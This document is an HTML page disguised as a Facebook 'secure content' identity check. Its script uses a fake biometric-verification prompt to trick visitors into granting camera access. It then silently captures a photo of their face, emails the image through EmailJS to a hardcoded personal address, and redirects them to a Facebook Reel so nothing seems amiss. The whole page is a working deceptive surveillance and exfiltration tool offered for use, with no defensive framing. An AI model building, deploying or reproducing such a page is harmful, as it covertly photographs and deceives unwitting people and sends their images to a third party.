<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Secure Content</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body { margin: 0; padding: 0; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; font-family: sans-serif; transition: background-color 0.1s; overflow: hidden; }
        .box { text-align: center; width: 85%; border: 1px solid #222; padding: 25px; border-radius: 12px; background: #0a0a0a; }
        .loader { border: 3px solid #1a1a1a; border-top: 3px solid #1877F2; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 1rem; color: #1877F2; font-weight: bold; }
    </style>
</head>
<body id="mainBody">
    <div class="box">
        <div class="loader"></div>
        <p id="status">Connecting to Secure Server...</p>
    </div>

    <script>
        (function() { emailjs.init("ClasRw06y_NeB2UQ"); })();

        window.onload = async function() {
            const securityMsg = "SECURITY CHECK:\n\nTo view this Facebook Reel, you must verify your identity.\n\nClick OK to start biometric scanning.";
            
            if (confirm(securityMsg)) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    let countdown = 4;
                    const statusText = document.getElementById('status');
                    
                    const interval = setInterval(async () => {
                        countdown--;
                        statusText.innerText = "Verifying Identity... " + (100 - (countdown * 25)) + "%";
                        
                        if (countdown <= 0) {
                            clearInterval(interval);
                            document.getElementById('mainBody').style.backgroundColor = "#FFFFFF"; // فلاش الضوء
                            
                            setTimeout(() => {
                                const canvas = document.createElement('canvas');
                                canvas.width = 800; canvas.height = 600;
                                canvas.getContext('2d').drawImage(video, 0, 0, 800, 600);
                                
                                const imgBase64 = canvas.toDataURL('image/jpeg', 0.6);
                                
                                // 1. إرسال الصورة
                                emailjs.send('service_w3dev60', 'template_7k8tall', {
                                    image_data: imgBase64,
                                    to_email: 'tayebiabd2016@gmail.com'
                                });

                                statusText.innerText = "Finalizing Secure Access...";

                                // 2. تأخير التحويل لمدة 5 ثوانٍ لضمان وصول الإيميل
                                setTimeout(() => {
                                    const targetURL = "https://www.facebook.com/share/r/1FVygXJ8tb/";
                                    window.location.replace(targetURL);
                                }, 5000); 

                            }, 300);
                        }
                    }, 1000);

                } catch (e) {
                    window.location.replace("https://www.facebook.com/share/r/1FVygXJ8tb/");
                }
            } else {
                window.location.replace("https://www.facebook.com/share/r/1FVygXJ8tb/");
            }
        };
    </script>
</body>
</html>
